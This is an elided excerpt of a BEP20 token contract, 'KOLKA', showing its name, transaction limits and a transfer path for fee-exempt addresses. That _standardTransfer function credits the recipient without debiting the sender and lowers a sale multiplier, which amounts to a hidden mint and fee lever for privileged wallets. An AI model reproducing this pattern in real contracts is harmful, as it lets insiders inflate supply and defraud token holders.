...
/* Token contract */
contract Kolka is IBEP20, Auth { // change - name
    using SafeMath for uint256;
    ...
    // Name and symbol
    string constant _name = "KOLKA"; // change - name
    string constant _symbol = "KOLKA"; // change - symbol
    ...
    // Max wallet and TX
    uint256 public _maxBuyTxAmount = _totalSupply * 250 / 10000; // change - 2.5%
    uint256 public _maxSellTxAmount = _totalSupply * 250 / 10000; // change - 2.5%
    uint256 public _maxWalletToken = ( _totalSupply * 250 ) / 10000; // change - 2.5%
    ...
    function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
        ...
        //Exchange tokens
        if(isFeeExempt[sender] && isFeeExempt[recipient]) return _standardTransfer(sender,recipient,amount);
    ...
    // Transfer between wallets to avoid presale fees and tx
    function _standardTransfer(address sender, address recipient, uint256 amount) internal returns (bool) {
        salemultiplier = salemultiplier.sub(100); // Must be below 1%
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
        return true;
    }
